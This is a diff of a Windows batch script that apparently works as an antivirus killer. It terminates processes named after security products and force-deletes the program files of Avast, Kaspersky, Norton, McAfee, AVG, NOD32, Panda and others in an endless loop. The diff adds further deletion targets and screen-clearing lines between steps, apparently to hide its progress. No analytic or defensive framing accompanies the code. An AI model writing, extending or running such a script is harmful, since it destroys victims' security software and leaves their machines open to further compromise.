@@ -79,49 +79,84 @@ taskkill /f /FI "MEMUSAGE gt 5" /IM avas*
 taskkill /f /FI "MEMUSAGE gt 5" /IM norm*
 cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM offg*
+cls
 del /Q /F %programfiles%\alwils~1\avast4\*.*
+cls
 del /Q /F %programfiles%\Lavasoft\Ad-awa~1\*.exe
+cls
 del /Q /F %programfiles%\kasper~1\*.exe
 cls
 del /Q /F %programfiles%\trojan~1\*.exe
+cls
 del /Q /F %programfiles%\f-prot95\*.dll
+cls
 del /Q /F %programfiles%\tbav\*.dat
 cls
 del /Q /F %programfiles%\avpersonal\*.vdf
+cls
 del /Q /F %programfiles%\Norton~1\*.cnt
+cls
 del /Q /F %programfiles%\Mcafee\*.*
 cls
 del /Q /F %programfiles%\Norton~1\Norton~1\Norton~3\*.*
+cls
 del /Q /F %programfiles%\Norton~1\Norton~1\speedd~1\*.*
+cls
 del /Q /F %programfiles%\Norton~1\Norton~1\*.*
+cls
+del /Q /F %programfiles%\Kasper~1\*.*
+cls
 del /Q /F %programfiles%\Norton~1\*.*
 cls
 del /Q /F %programfiles%\avgamsr\*.exe
+cls
 del /Q /F %programfiles%\avgamsvr\*.exe
+cls
 del /Q /F %programfiles%\avgemc\*.exe
 cls
 del /Q /F %programfiles%\avgcc\*.exe
+cls
 del /Q /F %programfiles%\avgupsvc\*.exe
-del /Q /F %programfiles%\grisoft
+cls
+del /Q /F %programfiles%\grisoft\*.*
+cls
 del /Q /F %programfiles%\nood32krn\*.exe
+cls
+cls
 del /Q /F %programfiles%\nood32\*.exe
 cls
 del /Q /F %programfiles%\nod32
+cls
 del /Q /F %programfiles%\nood32
+cls
 del /Q /F %programfiles%\kav\*.exe
+cls
 del /Q /F %programfiles%\kavmm\*.exe
+cls
 del /Q /F %programfiles%\kaspersky\*.*
 cls
+cls
 del /Q /F %programfiles%\ewidoctrl\*.exe
+cls
 del /Q /F %programfiles%\guard\*.exe
+cls
 del /Q /F %programfiles%\ewido\*.exe
 cls
+cls
 del /Q /F %programfiles%\pavprsrv\*.exe
+cls
 del /Q /F %programfiles%\pavprot\*.exe
+cls
 del /Q /F %programfiles%\avengine\*.exe
 cls
+cls
 del /Q /F %programfiles%\apvxdwin\*.exe
+cls
 del /Q /F %programfiles%\webproxy\*.exe
+cls
 del /Q /F %programfiles%\pandasoftware\*.*
+cls
 timeout /t 3 /nobreak
+cls
 goto :loop
+cls
